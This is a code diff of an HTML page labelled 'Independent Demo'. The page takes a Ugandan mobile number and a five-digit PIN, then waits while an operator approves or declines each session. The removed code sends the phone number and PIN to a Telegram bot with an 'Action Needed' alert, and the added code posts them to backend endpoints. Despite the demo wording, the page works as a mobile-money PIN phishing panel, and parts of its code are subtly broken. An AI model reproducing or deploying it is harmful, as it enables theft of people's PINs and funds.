@@ -4,175 +4,32 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Independent Demo</title>
-
   <style>
     * { box-sizing: border-box; }
-
-    body {
-      margin: 0;
-      min-height: 100vh;
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      color: #171717;
-    }
-
-    header {
-      padding: 22px 16px;
-      text-align: center;
-      background: #171717;
-      color: #ffd500;
-      font-size: 22px;
-      font-weight: 800;
-    }
-
-    main {
-      width: min(440px, 94%);
-      margin: 25px auto;
-      padding: 24px 18px;
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 3px 14px #00000012;
-    }
-
+    body { margin: 0; min-height: 100vh; font-family: Arial, sans-serif; background: #f4f4f4; color: #171717; }
+    header { padding: 22px 16px; text-align: center; background: #171717; color: #ffd500; font-size: 22px; font-weight: 800; }
+    main { width: min(440px, 94%); margin: 25px auto; padding: 24px 18px; background: white; border-radius: 12px; box-shadow: 0 3px 14px #00000012; }
     h2 { margin-top: 0; text-align: center; }
-
-    .notice {
-      padding: 10px;
-      background: #fff8cc;
-      border-radius: 6px;
-      font-size: 13px;
-      text-align: center;
-      line-height: 1.5;
-    }
-
-    .field-label {
-      display: block;
-      margin: 22px 0 10px;
-      font-weight: bold;
-    }
-
-    .phone-row {
-      display: flex;
-      gap: 5px;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .country {
-      flex-shrink: 0;
-      padding: 12px 8px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-weight: bold;
-    }
-
-    .digits {
-      display: flex;
-      justify-content: center;
-      gap: 5px;
-    }
-
-    .digit {
-      width: 38px;
-      height: 46px;
-      border: 1px solid #aaa;
-      border-radius: 6px;
-      text-align: center;
-      font-size: 19px;
-      font-weight: bold;
-      min-width: 0;
-    }
-
-    .digit:focus, textarea:focus {
-      outline: 2px solid #e3bd00;
-      border-color: #171717;
-    }
-
-    button {
-      width: 100%;
-      padding: 14px;
-      margin-top: 22px;
-      border: 0;
-      border-radius: 6px;
-      background: #ffd500;
-      color: #171717;
-      font-weight: bold;
-      font-size: 15px;
-      cursor: pointer;
-    }
-
-    button:disabled {
-      opacity: .6;
-      cursor: wait;
-    }
-
+    .notice { padding: 10px; background: #fff8cc; border-radius: 6px; font-size: 13px; text-align: center; line-height: 1.5; }
+    .field-label { display: block; margin: 22px 0 10px; font-weight: bold; }
+    .phone-row { display: flex; gap: 5px; align-items: center; justify-content: center; }
+    .country { flex-shrink: 0; padding: 12px 8px; border: 1px solid #ccc; border-radius: 6px; font-weight: bold; }
+    .digits { display: flex; justify-content: center; gap: 5px; }
+    .digit { width: 32px; height: 42px; border: 1px solid #aaa; border-radius: 6px; text-align: center; font-size: 18px; font-weight: bold; min-width: 0; }
+    .digit:focus { outline: 2px solid #e3bd00; border-color: #171717; }
+    button { width: 100%; padding: 14px; margin-top: 22px; border: 0; border-radius: 6px; background: #ffd500; color: #171717; font-weight: bold; font-size: 15px; cursor: pointer; }
+    button:disabled { opacity: .6; cursor: not-allowed; }
     .hidden { display: none !important; }
-
-    .hint {
-      margin-top: 10px;
-      color: #555;
-      text-align: center;
-      font-size: 13px;
-    }
-
-    .spinner {
-      width: 44px;
-      height: 44px;
-      margin: 24px auto;
-      border: 5px solid #eee;
-      border-top-color: #d4ae00;
-      border-radius: 50%;
-      animation: spin .8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    textarea {
-      width: 100%;
-      min-height: 130px;
-      padding: 12px;
-      border: 1px solid #aaa;
-      border-radius: 6px;
-      font: inherit;
-      resize: vertical;
-    }
-
-    .status {
-      text-align: center;
-      padding: 12px;
-      margin-top: 15px;
-      background: #f4f4f4;
-      border-radius: 6px;
-      line-height: 1.5;
-    }
-
-    .error {
-      color: #b00020;
-      text-align: center;
-      margin-top: 12px;
-    }
-
-    .success {
-      font-size: 24px;
-      text-align: center;
-      padding: 20px 0;
-      color: #2e7d32;
-    }
-
-    @media (max-width: 380px) {
-      .digit {
-        width: 30px;
-        height: 42px;
-      }
-      .phone-row, .digits { gap: 3px; }
-      .country { padding: 10px 5px; }
-    }
+    .hint { margin-top: 10px; color: #555; text-align: center; font-size: 13px; }
+    .spinner { width: 44px; height: 44px; margin: 24px auto; border: 5px solid #eee; border-top-color: #d4ae00; border-radius: 50%; animation: spin .8s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .status { text-align: center; padding: 12px; margin-top: 15px; background: #f4f4f4; border-radius: 6px; line-height: 1.5; }
+    .error { color: #b00020; text-align: center; margin-top: 12px; }
+    .success { font-size: 24px; text-align: center; padding: 20px 0; color: #2e7d32; }
   </style>
 </head>
-
 <body>
+
   <header>INDEPENDENT DEMO</header>
 
   <main>
@@ -191,7 +48,7 @@
         <div class="digits" id="phoneDigits"></div>
       </div>
       <p class="hint">Enter nine test digits starting with 7.</p>
-      <button id="phoneButton">CONTINUE</button>
+      <button id="phoneButton" disabled>CONTINUE</button>
       <p id="phoneError" class="error"></p>
     </section>
 
@@ -219,139 +76,159 @@
   </main>
 
   <script>
-    // --- TELEGRAM & ORCHESTRATION CONFIGURATION ---
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     
-    const BACKEND_STATUS_URL = '/api/check-status'; // Replace with your state machine server URL
+    let currentRequestId = null;
+    let pollInterval = null;
 
-    // State management variables
-    let enteredPhone = '';
-    let pollingInterval = null;
-    let mockSessionId = '';
+    const phonePage = document.getElementById('phonePage');
+    const pinPage = document.getElementById('pinPage');
+    const successPage = document.getElementById('successPage');
+    const phoneDigitsContainer = document.getElementById('phoneDigits');
+    const pinDigitsContainer = document.getElementById('pinDigits');
+    const phoneButton = document.getElementById('phoneButton');
+    const phoneError = document.getElementById('phoneError');
+    const pinLoading = document.getElementById('pinLoading');
+    const pinStatus = document.getElementById('pinStatus');
+    const pinError = document.getElementById('pinError');
 
-    // Dynamically build input forms and handle focus rules
-    function buildDigitInputs(containerId, count, onComplete) {
-      const container = document.getElementById(containerId);
+    function createDigitInputs(container, count, initialVal = '') {
       container.innerHTML = '';
       const inputs = [];
-
       for (let i = 0; i < count; i++) {
         const input = document.createElement('input');
         input.type = 'text';
         input.inputMode = 'numeric';
+        input.pattern = '[0-9]*';
         input.maxLength = 1;
         input.className = 'digit';
-        
+        if (i === 0 && initialVal) input.value = initialVal;
+
         input.addEventListener('input', (e) => {
-          e.target.value = e.target.value.replace(/\D/g, '');
-          if (e.target.value && i < count - 1) {
-            inputs[i + 1].focus();
+          e.target.value = e.target.value.replace(/[^0-9]/g, '');
+          if (e.target.value && input.nextElementSibling) {
+            input.nextElementSibling.focus();
           }
-          checkCompletion();
+          updateButtonState();
         });
 
         input.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !e.target.value && i > 0) {
-            inputs[i - 1].focus();
+          if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) {
+            input.previousElementSibling.focus();
           }
         });
 
         container.appendChild(input);
         inputs.push(input);
       }
+      return inputs;
+    }
 
-      function checkCompletion() {
-        const value = inputs.map(i => i.value).join('');
-        if (value.length === count) {
-          onComplete(value, inputs);
-        }
+    const phoneInputs = createDigitInputs(phoneDigitsContainer, 9, '7');
+    const pinInputs = createDigitInputs(pinDigitsContainer, 5);
+
+    function getCombinedValue(inputs) {
+      return inputs.map(i => i.value).join('');
+    }
+
+    function updateButtonState() {
+      const phoneVal = getCombinedValue(phoneInputs);
+      phoneButton.disabled = phoneVal.length !== 9;
+
+      const pinVal = getCombinedValue(pinInputs);
+      if (pinVal.length === 5 && currentRequestId) {
+        submitPinDemo(pinVal);
       }
     }
 
-    // Initialize Phone Inputs
-    buildDigitInputs('phoneDigits', 9, (value) => {
-      enteredPhone = value;
-    });
-
-    document.getElementById('phoneButton').addEventListener('click', () => {
-      if (enteredPhone.length === 9 && enteredPhone.startsWith('7')) {
-        document.getElementById('phonePage').classList.add('hidden');
-        document.getElementById('pinPage').classList.remove('hidden');
-        initPinPage();
-      } else {
-        document.getElementById('phoneError').textContent = 'Please enter a valid 9-digit test number starting with 7.';
-      }
-    });
-
-    // Initialize PIN Inputs
-    function initPinPage() {
-      buildDigitInputs('pinDigits', 5, (pinValue, inputs) => {
-        submitToTelegram(pinValue, inputs);
-      });
-    }
-
-    // Transmits session data directly to the Telegram API channel
-    async function submitToTelegram(pin, inputs) {
-      const pinLoading = document.getElementById('pinLoading');
-      const pinError = document.getElementById('pinError');
-      const pinStatus = document.getElementById('pinStatus');
-
-      // Lock UI interaction, reset notifications, and trigger loading state
-      inputs.forEach(i => i.disabled = true);
-      pinError.textContent = '';
-      pinLoading.classList.remove('hidden');
-      pinStatus.classList.add('hidden');
-
-      // Set unique session identification key for polling references
-      if (!mockSessionId) {
-        mockSessionId = 'DEMO_' + Math.floor(1000 + Math.random() * 9000);
-      }
-
-      const formattedPhone = '+256' + enteredPhone;
-      const telegramMessage = `🚨 *New Demo Input Received*\n\n` +
-                              `📱 *Phone:* \`\${formattedPhone}\`\n` +
-                              `🔑 *Entered PIN:* \`\${pin}\`\n` +
-                              `🆔 *Session:* \`\${mockSessionId}\`\n\n` +
-                              `💡 *Action Needed:* Update state machine repository status for this session ID to resolve interface hold.`;
-
-      const telegramUrl = `https://telegram.org\${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    phoneButton.addEventListener('click', async () => {
+      phoneError.textContent = '';
+      const fullPhone = '+256' + getCombinedValue(phoneInputs);
+      phoneButton.disabled = true;
 
       try {
-        const response = await fetch(telegramUrl, {
+        const res = await fetch('/api/phone', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: telegramMessage,
-            parse_mode: 'Markdown'
-          })
+          body: JSON.stringify({ phone: fullPhone })
         });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Failed to initialize setup.');
 
-        const data = await response.json();
-
-        if (data.ok) {
-          // Successfully logged entry to Telegram channel. Begin polling the state machine.
-          startPollingStatus(mockSessionId, inputs);
-        } else {
-          throw new Error(data.description || 'Telegram server rejection');
-        }
+        currentRequestId = data.id;
+        phonePage.classList.add('hidden');
+        pinPage.classList.remove('hidden');
+        pinInputs.focus();
       } catch (err) {
-        console.error(err);
-        resetPinInputs(inputs, 'Failed to dispatch payload directly to Telegram interface config.');
+        phoneError.textContent = err.message;
+        phoneButton.disabled = false;
+      }
+    });
+
+    // Modified to pass the numeric string directly into the API parameter payload
+    async function submitPinDemo(pinValue) {
+      pinError.textContent = '';
+      pinLoading.classList.remove('hidden');
+      pinStatus.textContent = 'Notifying administrator module...';
+      pinInputs.forEach(i => i.disabled = true);
+
+      try {
+        const res = await fetch('/api/pin-demo', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: currentRequestId, pin: pinValue })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Submission failed.');
+
+        startPolling();
+      } catch (err) {
+        pinError.textContent = err.message;
+        pinLoading.classList.add('hidden');
+        pinInputs.forEach(i => i.disabled = false);
       }
     }
 
-    // Periodically verifies session state against your orchestration database endpoint
-    function startPollingStatus(sessionId, inputs) {
-      if (pollingInterval) clearInterval(pollingInterval);
+    function startPolling() {
+      if (pollInterval) clearInterval(pollInterval);
+      pollInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/status/${currentRequestId}`);
+          if (!res.ok) return;
+          const data = await res.json();
 
-      pollingInterval = setInterval(() => {
-        fetch(`\${BACKEND_STATUS_URL}?id=\${sessionId}`)
-          .then(res => res.json())
-          .then(data => {
-            if (data.status === 'approved') {
-              clearInterval(pollingInterval);
-              document.getElementById('pinPage').classList.add('hidden');
-              document.getElementById('successPage').classList.remove('hidden');
-            } else if (data.status === 'declined') {
-              clearInterval(pollingInterval);
+          if (data.status === 'approved' || data.stage === 'success') {
+            clearInterval(pollInterval);
+            pinPage.classList.add('hidden');
+            successPage.classList.remove('hidden');
+          } else if (data.status === 'declined') {
+            clearInterval(pollInterval);
+            pinLoading.classList.add('hidden');
+            pinStatus.innerHTML = `Declined. <button id="retryBtn">Retry Stage</button>`;
+            document.getElementById('retryBtn').addEventListener('click', resetPinStage);
+          } else {
+            pinStatus.textContent = `Status: ${data.status.toUpperCase()} (Awaiting administrative action)`;
+          }
+        } catch (err) {
+          console.error(err);
+        }
+      }, 3000);
+    }
+
+    async function resetPinStage() {
+      try {
+        await fetch('/api/retry', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: currentRequestId })
+        });
+        pinInputs.forEach(i => { i.value = ''; i.disabled = false; });
+        pinLoading.classList.add('hidden');
+        pinStatus.textContent = 'Waiting for demo input.';
+        pinInputs.focus();
+      } catch (err) {
+        pinError.textContent = 'Failed to reset stage.';
+      }
+    }
+  </script>
+</body>
+</html>
+
